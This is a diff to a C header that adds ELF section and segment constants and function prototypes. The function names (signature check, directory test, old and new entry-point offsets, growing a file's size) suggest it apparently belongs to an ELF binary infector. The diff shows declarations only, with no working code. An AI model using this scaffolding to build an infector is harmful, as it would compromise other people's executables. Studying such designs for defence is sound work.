@@ -27,7 +27,17 @@
 #define	S_ISDIR(mode)	 __S_ISTYPE((mode), __S_IFDIR)
 
 #define PF_X 0x1
+#define PF_W 2
+#define PF_R 4
 #define SHF_EXECINSTR 0x4
+
+#define SHT_DYNAMIC 6
+#define SHT_NOBITS 8
+#define SHT_PROGBITS 1	
+#define SHF_ALLOC 2
+#define SHF_WRITE 1
+
+#define PT_LOAD 1
 
 
 struct ELFheaders64 {
@@ -99,7 +109,15 @@ int check_file(struct ELFheaders64 fHdr);
 int checkSignature(int fd, const char *signature);
 unsigned char isDir(const char *path);
 int find_offset_nentry_oentry(unsigned long int oep, unsigned long int nep);
+int get_section_index(int flags, unsigned int type, struct ELFheaders64 fHdr, struct sheaders64 *sHdrs);
 
 unsigned long int    writeFile(int fd, struct ELFheaders64 fHdr);
+
+void    findLastExecSection(struct sheaders64 *sHdrs, struct ELFheaders64 fHdr, int *last_sHdr_exec);
+int    findLastLoadSection(struct sheaders64 *sHdrs, struct ELFheaders64 fHdr, struct pheaders64 pHdr);
+int get_last_load_segment(struct pheaders64 *pHdrs, struct ELFheaders64 fHdr);
+unsigned char increaseFileSize(int fd, struct ELFheaders64 fHdr, struct sheaders64 *sHdrs);
+
+// void ft_print_hexa_raw(unsigned char *buf, size_t len);
 
 #endif
